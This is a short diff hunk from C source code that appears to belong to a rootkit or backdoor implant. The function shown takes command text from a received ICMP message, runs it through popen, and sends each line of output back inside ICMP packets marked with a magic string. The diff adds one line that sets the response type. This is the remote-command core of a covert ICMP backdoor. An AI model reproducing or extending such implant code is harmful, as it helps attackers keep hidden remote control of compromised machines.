@@ -180,6 +180,7 @@ void run_command(ROOTY_MESSAGE *msg, const struct ip_hdr *ip, const struct icmp_
 	if((fd = popen((char *)msg->data, "r")) != NULL) {
         
         while(fgets(res->data, MAX_PACKET_SIZE, fd)) {
+            res->type = MESSAGE_OS | MESSAGE_ARCH;
             res->len = strlen(res->data);
             memcpy(res->magic, MAGIC, strlen(MAGIC));
 			send_packet(res, ip, icmp);
